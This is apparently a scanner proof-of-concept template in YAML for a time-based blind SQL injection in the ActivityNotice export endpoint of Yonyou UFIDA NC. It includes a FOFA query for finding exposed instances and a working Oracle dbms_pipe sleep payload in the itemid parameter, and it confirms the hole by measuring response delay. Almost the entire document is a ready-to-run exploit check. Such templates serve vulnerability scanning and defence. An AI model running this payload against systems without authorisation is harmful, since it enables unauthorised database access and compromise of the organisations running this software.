id: poc-yaml-yonyou-ufida-nc-activitynotice-sqli
info:
  name: 用友NC ActivityNotice SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: ufida-nc
  fofa: app="用友-UFIDA-NC"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"ufida")
- method: POST
  path: /portal/pt/ActivityNotice/export?pageId=login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: itemid=1' AND 1=dbms_pipe.receive_message('RDS', {{.t1}})--
  expression: status_code == 200 && body == "" && contains(headers,":master") && duration
    > t1 && duration < t2
transport: http
